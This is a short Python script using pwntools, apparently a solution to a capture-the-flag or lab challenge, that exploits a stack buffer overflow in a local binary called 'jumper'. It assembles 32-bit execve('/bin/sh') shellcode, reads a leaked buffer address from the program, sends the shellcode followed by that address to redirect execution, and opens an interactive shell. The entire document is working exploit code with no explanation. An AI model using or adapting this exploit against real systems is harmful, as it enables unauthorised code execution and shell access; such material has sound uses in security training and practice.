from pwn import *

p = process("./jumper")

shellcode = asm('''
    /* argv = envp = NULL */
    xor edx, edx
    xor ecx, ecx

    /* push '/bin/sh' onto stack */
    push 0x68
    push 0x732f2f2f
    push 0x6e69622f
    mov ebx, esp

    /* call execve() */
    mov eax, 0xb /* Syscall Number 11 */
    int 0x80  /* Trigger syscall */
''')

print(len(shellcode))

p.recvuntil("&input=")
buffer = int(p.recvline().strip().decode('utf-8'), 16)

print(hex(buffer))

exploit = b"\x90" * 3
exploit = shellcode
exploit += p32(buffer)

p.sendlineafter("Hello\n", exploit)
p.interactive()
p.close()
